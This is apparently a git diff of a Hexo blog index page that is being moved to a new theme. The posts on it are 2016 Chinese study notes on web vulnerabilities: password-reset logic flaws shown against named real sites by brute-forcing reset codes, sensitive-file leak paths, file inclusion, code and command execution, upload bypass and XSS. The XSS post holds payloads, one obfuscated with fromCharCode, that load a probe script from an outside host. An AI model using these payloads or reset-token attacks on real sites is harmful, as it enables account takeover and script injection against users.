@@ -1,98 +1,143 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
   
   <title>liuqi</title>
-  <meta name="author" content="liuqi">
-  
-  <meta name="description" content="吃吃睡睡终其一生">
-  
-  
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-
+  <meta name="description" content="吃吃睡睡终其一生">
+<meta property="og:type" content="website">
+<meta property="og:title" content="liuqi">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="liuqi">
+<meta property="og:description" content="吃吃睡睡终其一生">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="liuqi">
+<meta name="twitter:description" content="吃吃睡睡终其一生">
   
-  <meta property="og:site_name" content="liuqi"/>
-
+    <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
   
-    <meta property="og:image" content="undefined"/>
   
-
-  <link href="/favicon.png" rel="icon">
-  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
-  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
-  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="css/style.css">
   
 
 </head>
 
-
 <body>
-  <header id="header" class="inner"><div class="alignleft">
-  <h1><a href="/">liuqi</a></h1>
-  <h2><a href="/"></a></h2>
-</div>
-<nav id="main-nav" class="alignright">
-  <ul>
-    
-      <li><a href="/">Home</a></li>
-    
-      <li><a href="/archives">Archives</a></li>
-    
-  </ul>
-  <div class="clearfix"></div>
-</nav>
-<div class="clearfix"></div>
-</header>
-  <div id="content" class="inner">
-    <div id="main-col" class="alignleft"><div id="wrapper">
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-08-04T00:58:34.000Z"><a href="/2016/08/04/逻辑漏洞/">2016-08-04</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2016/08/04/逻辑漏洞/">逻辑漏洞</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="index.html" id="logo">liuqi</a>
+      </h1>
       
     </div>
-    <footer>
-      
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
         
+          <a class="main-nav-link" href="index.html">Home</a>
         
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-逻辑漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/08/04/逻辑漏洞/" class="article-date">
+  <time datetime="2016-08-04T00:58:34.000Z" itemprop="datePublished">2016-08-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/08/04/逻辑漏洞/">逻辑漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-      <div class="clearfix"></div>
+        <p><strong>逻辑漏洞</strong><br>  是一种业务逻辑上的设计缺陷，业务流存在问题。<br>这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。<br>密码重置逻辑漏洞<br>密码找回流程<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/1.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/2.png?raw=true" alt="image"></p>
+<p>邮箱弱token</p>
+<p>密码重置逻辑漏洞 实例<br>1.先用临时邮箱注册一个号<br>2.将这个注册的账号退出<br>3.点登陆下面的找回密码<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/3.png?raw=true" alt="image"><br>4.下一步有输入对应账号的校验码，获取校验码之后，将连接复制，点击下一步，用反向代理进行拦截<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/4.png?raw=true" alt="image"><br>分析一下抓取的包，看一下自己填的校验码在哪里，然后进行爆破验证码</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/5.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/6.png?raw=true" alt="image"><br>获取到验证码之后改一下返回包，Ok可以放了就可以重置密码啦<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/7.png?raw=true" alt="image"></p>
+<p>手机注册<br><a href="http://www.xm030.com/" target="_blank" rel="external">http://www.xm030.com/</a></p>
+<p>萌乐网<br>申请到一个账号，然后退出，点击忘记密码，然后就会给你发一个链接,分析一下这个链接</p>
+<p><a href="http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY2NTYx" target="_blank" rel="external">http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY2NTYx</a><br><a href="http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY1NTM4" target="_blank" rel="external">http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY1NTM4</a><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/8.png?raw=true" alt="image"><br>用base64进行解密，发现只有后面的四位是随机的，其他都是自己的邮箱加上&amp;符号，因此只要得到后面四位验证码就可以进行重新设置密码<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/9.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/10.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/11.png?raw=true" alt="image"><br>点击发送链接之后，构造一个payload<br><a href="http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;;token=99999999" target="_blank" rel="external">http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;;token=99999999</a><br>抓包进行爆破它的验证码</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/12.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/13.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/14.png?raw=true" alt="image"><br>这个出现正确的之后链接已经失效，要自己写一个代码找到验证码之后就可以不然链接失效</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/15.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cirh0pzsi000ps4hroa379qq5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/逻辑/">逻辑</a></li></ul>
+
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-08-01T00:32:05.000Z"><a href="/2016/08/01/敏感信息泄露/">2016-08-01</a></time>
-      
-      
+    <article id="post-敏感信息泄露" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/08/01/敏感信息泄露/" class="article-date">
+  <time datetime="2016-08-01T00:32:05.000Z" itemprop="datePublished">2016-08-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/08/01/敏感信息泄露/">敏感信息泄露</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/08/01/敏感信息泄露/">敏感信息泄露</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <p><strong>软件敏感信息</strong><br>nmap扫描判断操作系统版本<br>中间件类型和版本<br>http返回头部server<br>404报错信息<br>工具：./wahtweb<br><strong>web敏感信息</strong><br>cms类型和版本<br>敏感文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">*phpinfo()信息泄漏</div><div class="line">    http://[ip]/test.php和http://[ip]/phpinfo.php</div><div class="line">* 测试页面泄漏在外网</div><div class="line">    test.cgi、phpinfo.php、info.php等</div><div class="line">* 编辑器备份文件泄漏在外网</div><div class="line">    http://[ip]/.test.php.swp</div><div class="line">    http://[ip]/test.php.bak</div><div class="line">    http://[ip]/test.jsp.old</div><div class="line">    http://[ip]/cgi~</div><div class="line">    常见编辑器备份后缀</div><div class="line">* 版本管理工具(如git)文件信息泄漏</div><div class="line">    http://[ip]/.git/config</div><div class="line">    http://[ip]/CVS/Entriesp</div><div class="line">    http://[ip]/.svn/entriesp</div><div class="line">* HTTP认证泄漏漏洞</div><div class="line">    http://[ip]/basic/index.php</div><div class="line">    Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码</div><div class="line">* 管理后台地址泄漏</div><div class="line">    http://[ip]/login.php</div><div class="line">    http://[ip]/admin.php</div><div class="line">    http://[ip]/manager.php</div><div class="line">    http://[ip]/admin_login.php</div><div class="line">* 泄漏员工邮箱、分机号码</div><div class="line">    泄漏邮箱及分机号码可被社工，也可生成字典</div><div class="line">* 错误页面暴漏信息</div><div class="line">    面熟sql错误、php错误、暴漏cms版本等</div><div class="line">* 探针文件</div><div class="line">* robots.txt</div><div class="line">* phpMyAdmin</div><div class="line">* 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等)</div><div class="line">* 其他</div></pre></td></tr></table></figure></p>
 <p><strong>网络信息泄露</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">* DNS域传送漏洞</div><div class="line">* 运维监控系统弱口令、网络拓扑泄漏</div><div class="line">    zabbix弱口令、zabbix sql注入等</div></pre></td></tr></table></figure></p>
@@ -104,34 +149,42 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/01/敏感信息泄露/" data-id="cirh0pzqr000gs4hrau4wjs1z" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-30T12:58:16.000Z"><a href="/2016/07/30/文件包含漏洞/">2016-07-30</a></time>
-      
-      
+    <article id="post-文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/30/文件包含漏洞/" class="article-date">
+  <time datetime="2016-07-30T12:58:16.000Z" itemprop="datePublished">2016-07-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/30/文件包含漏洞/">文件包含漏洞</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/30/文件包含漏洞/">文件包含漏洞</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <p><strong>原理</strong><br>传入的文件名没有经过合理的校验，或者被过滤，从而操作了预想之外的文件，就可以导致文件泄露甚至恶意的代码注入<br><strong>漏洞分类</strong><br><strong>本地文件包含</strong><br>  上传木马，包含<br>  读文件<br>  日志文件<br>   phpinfo可以包含临时文件<br><strong>远程文件包含</strong><br>  保证php.ini中allow_url_fopen和 allow_url_include打开<br><strong>常见的文件包含的函数</strong><br>        include()                 发生错误时继续执行   用到时加载<br>     include_once()包含一次<br>     require()输出错误信息，终止程序运行，一开始就加载<br>    require_once()程序只调用一次   表示已加载的不加载<br><strong>利用条件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户能够控制该动态变量</div><div class="line">**漏洞危害**</div><div class="line">执行任意代码</div><div class="line">包含恶意文件控制网站</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
 <p>看到参数，校验不严格，存在文件包含漏洞<br>&lt;?<br>$a=$_GET[‘file’];<br>include($a);<br>?&gt;<br>触发条件是include()<br>用这个代码搭建一个自己的环境<br><strong>本地文件包含</strong><br>   因为没有做过过滤，可以执行<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/1.png?raw=true" alt="image"></p>
@@ -142,34 +195,44 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/30/文件包含漏洞/" data-id="cirh0pzsx000us4hrg8y5wwuq" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/文件包含/">文件包含</a></li></ul>
+
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-30T12:20:08.000Z"><a href="/2016/07/30/任意代码执行漏洞/">2016-07-30</a></time>
-      
-      
+    <article id="post-任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/30/任意代码执行漏洞/" class="article-date">
+  <time datetime="2016-07-30T12:20:08.000Z" itemprop="datePublished">2016-07-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/30/任意代码执行漏洞/">任意代码执行漏洞</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/30/任意代码执行漏洞/">任意代码执行漏洞</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <p><strong>漏洞原理</strong><br>：<br>当应用调用一些能将字符串转换为代码的函数时，没有考虑安全性，用户是否可以控制这个字符，造成代码注入漏洞，如php中的eval函数，可以将字符串代表的代码作为php代码执行<br><strong>相关函数</strong><br>：<br>php:eval assert<br>python:exec<br>phpcms中的string2array函数<br>array(  //这个是字符串形式的数组，它并不是数组，而是字符串<br>    ‘upload_maxsize’ =&gt; ‘2048’,<br>    ‘upload_allowext’ =&gt; ‘jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf’,<br>    ‘watermark_enable’ =&gt; ‘1’,<br>    ‘watermark_minwidth’ =&gt; ‘300’,<br>    ‘watermark_minheight’ =&gt; ‘300’,<br>    ‘watermark_img’ =&gt; ‘/statics/images/water/mark.png’,<br>    ‘watermark_pct’ =&gt; ‘85’,<br>    ‘watermark_quality’ =&gt; ‘80’,<br>    ‘watermark_pos’ =&gt; ‘9’,<br>)<br>function string2array($data) {<br>    //这个函数可以将字符串$data转化为数组<br>    if($data == ‘’)<br>        return array();<br>    @eval(“\$array = $data;”);<br>        return $array;<br>}<br><strong>漏洞危害</strong><br>：<br>执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">让网站写shell</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
 <p><strong>漏洞分类</strong><br>：<br>执行代码的函数：eval.assert<br>callback函数：preg_replace+ /e模式<br>反序列化：unserialize()反序列化函数<br><strong>漏洞挖掘</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">框架找漏洞，如thinkphp:</div><div class="line">inurl:index.php intext:Thinkphp 2.1</div><div class="line">框架的URL格式如下：</div><div class="line"> Site:Port/Module name/Method name/Property name/Preperty value</div><div class="line"> Site:Port/index.php?m=Module_name&amp;f=Method_name&amp;v=Preperty_value</div><div class="line"> </div><div class="line"> www.xx.com:88/News/show/id/328</div><div class="line"> www.yy.com:99/index.php?m=News&amp;f=detail&amp;item=23</div></pre></td></tr></table></figure></p>
@@ -189,34 +252,40 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/30/任意代码执行漏洞/" data-id="cirh0pzr7000js4hrrv7lw7cx" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/代码执行/">代码执行</a></li></ul>
+
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-29T07:44:30.000Z"><a href="/2016/07/29/命令执行漏洞/">2016-07-29</a></time>
-      
-      
+    <article id="post-命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/29/命令执行漏洞/" class="article-date">
+  <time datetime="2016-07-29T07:44:30.000Z" itemprop="datePublished">2016-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/29/命令执行漏洞/">命令执行漏洞</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/29/命令执行漏洞/">命令执行漏洞</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数<br>主要是以Php为主，php中可以调用外部程序的常见的函数：system,exec,shell_exec,passthru,popen,proc_popen </p>
 <h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><ul>
@@ -254,34 +323,38 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/29/命令执行漏洞/" data-id="cirh0pzqr000es4hrm0gfhx1y" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-26T11:29:50.000Z"><a href="/2016/07/26/文件上传之绕过上传/">2016-07-26</a></time>
-      
-      
+    <article id="post-文件上传之绕过上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/26/文件上传之绕过上传/" class="article-date">
+  <time datetime="2016-07-26T11:29:50.000Z" itemprop="datePublished">2016-07-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/26/文件上传之绕过上传/">文件上传之绕过上传</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/26/文件上传之绕过上传/">文件上传之绕过上传</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <p><strong>一般防止上传漏洞手法</strong><br>1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证<br>    //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少<br>    //服务器开销，而服务端验证才可以真正防御攻击者。  2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法</p>
 <p><strong>客户端检测客户端验证代码形如下</strong>：</p>
@@ -349,34 +422,38 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/26/文件上传之绕过上传/" data-id="cirh0pzsx000ss4hrw0nft3qf" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-26T08:58:05.000Z"><a href="/2016/07/26/文件上传/">2016-07-26</a></time>
-      
-      
+    <article id="post-文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/26/文件上传/" class="article-date">
+  <time datetime="2016-07-26T08:58:05.000Z" itemprop="datePublished">2016-07-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/26/文件上传/">文件上传</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/26/文件上传/">文件上传</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <p><strong>文件上传攻击的原理</strong><br>由于服务器端没有对用户上传的文件进行正确的处理，导致攻击者可以向某个可通过 Web 访问的目录上传恶意文件，并且该文件可以被Web服务器解析执行。<br>攻击者要想成功实施文件上传攻击，必须要满足以下三个条件：<br>1.可以上传任意脚本文件，且上传的文件能够被Web服务器解析执行，具体来说就是存放上传文件的目录要有执行脚本的权限。<br>2.用户能够通过Web访问这个文件。如果文件上传后，不能通过Web访问，那么也不能成功实施攻击。<br>3.要知道文件上传到服务器后的存放路径和文件名称，因为许多Web应用都会修改上传文件的文件名称，那么这时就需要结合其他漏洞去获取到这些信息。如果不知道上传文件的存放路径和文件名称，即使你上传了也无法访问。</p>
 <p><strong>什么是文件上传漏洞</strong></p>
@@ -399,34 +476,38 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/26/文件上传/" data-id="cirh0pzr7000hs4hr6lq4bizc" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-22T07:08:13.000Z"><a href="/2016/07/22/xss实例/">2016-07-22</a></time>
-      
-      
+    <article id="post-xss实例" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/22/xss实例/" class="article-date">
+  <time datetime="2016-07-22T07:08:13.000Z" itemprop="datePublished">2016-07-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/22/xss实例/">xss实例</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/22/xss实例/">xss实例</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <p>#时光网#<br>登录之后<br>有一个我关注的话题然后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"></p>
 <p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
@@ -443,34 +524,38 @@
 
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/22/xss实例/" data-id="cirh0pzqr000bs4hre2s194gr" class="article-share-link">Share</a>
       
-        
-        
       
-      <div class="clearfix"></div>
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-18T13:26:46.000Z"><a href="/2016/07/18/xss的挖掘和利用/">2016-07-18</a></time>
-      
-      
+    <article id="post-xss的挖掘和利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/07/18/xss的挖掘和利用/" class="article-date">
+  <time datetime="2016-07-18T13:26:46.000Z" itemprop="datePublished">2016-07-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 class="title"><a href="/2016/07/18/xss的挖掘和利用/">xss的挖掘和利用</a></h1>
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/07/18/xss的挖掘和利用/">xss的挖掘和利用</a>
+    </h1>
   
 
-    </header>
-    <div class="entry">
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
         <p>#什么是XSS#<br>即跨站脚本发生在浏览器上<br>为什么用户浏览器渲染整个html文档出现了不可预期的脚本指令并执行<br>跨站脚本重要的是脚本<br>对于网站是不可预期的，对于攻击者是可预期的<br>这类攻击主要是浏览器解析执行的，浏览器不是看到什么就解析什么，不符合规定就不会执行。浏览器安全策略：同源策略<br>漏洞挖掘</p>
 <ul>
@@ -499,40 +584,45 @@
 <p><code><br> <script src='http://b.ioio.pub/xss/probe.js'><script><br>• <img src=x onerror="s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'";><br>• &lt;svg onload=s=createElement(‘script’);body.appendChild(s);s.src=’<a href="http://b.ioio.pub/xss/probe.js&gt;">http://b.ioio.pub/xss/probe.js&gt;</a><br>• <svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) ><br></code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xss简单示例</div><div class="line">发射型xss实列</div></pre></td></tr></table></figure></p>
 <p>&lt;?php<br>  echo $_GET[‘x’];<br>提交：<br>/xss.php?x=  &lt; scri pt&gt;alert(1)<script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器解析时就会触发弹窗</div><div class="line"></div><div class="line">?&gt;</div><div class="line">下面是一段经典的DOM型XSS示例：</div></pre></td></tr></table></figure></p>
 <p><script><br>    var temp = document.URL; //获取URL<br>    var index = document.URL.indexOf(“content”);<br>    var par = temp.substrint(index);<br>    document.write(decodeURL(par)); //输入获取内容<script><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">上述代码的意思是获取URL中content参数的值，并且输出，若输入```http://www.xxx.com/dom.html?content=&lt;script&gt;alert(/xss/)&lt;script&gt;```，就会产生XSS漏洞。</div><div class="line"></div><div class="line">xss的防御</div><div class="line">使用htmlspecialchars()和hemlentities()将一些预定义的字符转换为html实体</div><div class="line">```&lt;?php</div><div class="line">              $html = $_GET[&apos;x&apos;];</div><div class="line">   if($html)&#123;</div><div class="line">echo htnlspecialchars($html）&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+        
+          <p class="article-more-link">
+            <a href="2016/07/18/xss的挖掘和利用/#more">Read More</a>
+          </p>
+        
       
     </div>
-    <footer>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/18/xss的挖掘和利用/" data-id="cirh0pzqc000as4hrdk41h8ad" class="article-share-link">Share</a>
       
-        
-          <div class="alignleft">
-            <a href="/2016/07/18/xss的挖掘和利用/#more" class="more-link">Read More</a>
-          </div>
-        
-        
       
-      <div class="clearfix"></div>
     </footer>
   </div>
+  
 </article>
 
 
-
-
-  <article class="post">
   
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
